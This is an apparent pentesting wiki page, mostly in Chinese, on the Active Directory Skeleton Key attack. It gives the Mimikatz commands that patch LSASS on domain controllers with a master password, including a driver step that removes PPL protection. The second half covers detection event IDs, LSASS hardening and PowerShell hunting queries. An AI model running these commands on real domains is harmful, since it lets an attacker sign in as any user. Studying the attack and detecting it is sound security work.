# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack** 是一种技术，允许攻击者通过将一个主密码注入到每个 domain controller 的 LSASS 进程来**绕过 Active Directory authentication**。注入后，该主密码（默认 **`mimikatz`**）可用于以**any domain user** 身份进行认证，同时他们的真实密码仍然有效。

Key facts:

- 需要在每个 DC 上拥有 **Domain Admin/SYSTEM + SeDebugPrivilege**，并且必须在**每次重启后重新应用**。
- 会修补 **NTLM** 和 **Kerberos RC4 (etype 0x17)** 的验证路径；仅支持 AES 的域或强制使用 AES 的账户将**不接受 skeleton key**。
- 可能与第三方 LSA authentication packages 或额外的 smart‑card / MFA providers 存在冲突。
- Mimikatz 模块接受可选开关 `/letaes`，以在兼容性问题时避免触及 Kerberos/AES 钩子。

### Execution

经典、非‑PPL 保护的 LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
如果 **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS)，需要一个内核驱动来在修补 LSASS 之前移除保护：
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
注入后，使用任意域账户进行身份验证，但使用密码 `mimikatz`（或操作者设置的值）。在多域控制器环境中，记得在**所有 DCs**上重复。

## 缓解措施

- **日志监控**
- System **Event ID 7045**（服务/驱动安装），针对未签名驱动，例如 `mimidrv.sys`。
- **Sysmon**：Event ID 7（驱动加载）用于 `mimidrv.sys`；Event ID 10 用于检测来自非系统进程对 `lsass.exe` 的可疑访问。
- Security **Event ID 4673/4611** 用于检测敏感权限使用或 LSA 身份验证包注册异常；与来自 DCs 的使用 RC4 (etype 0x17) 的异常 4624 登录相关联。
- **加固 LSASS**
- 在 DCs 上保持启用 **RunAsPPL/Credential Guard/Secure LSASS**，以迫使攻击者采用内核模式驱动部署（更多遥测，更难被利用）。
- 尽量禁用旧的 **RC4**；将 Kerberos 票证限制为 AES 可以阻止 skeleton key 使用的 RC4 hook 路径。
- 快速 PowerShell 搜索：
- 检测未签名的内核驱动安装： `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- 查找 Mimikatz 驱动： `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- 验证重启后是否强制启用 PPL： `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

有关其他凭据加固指导，请查看 [Windows credentials protections](../stealing-credentials/credentials-protections.md)。

## References

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
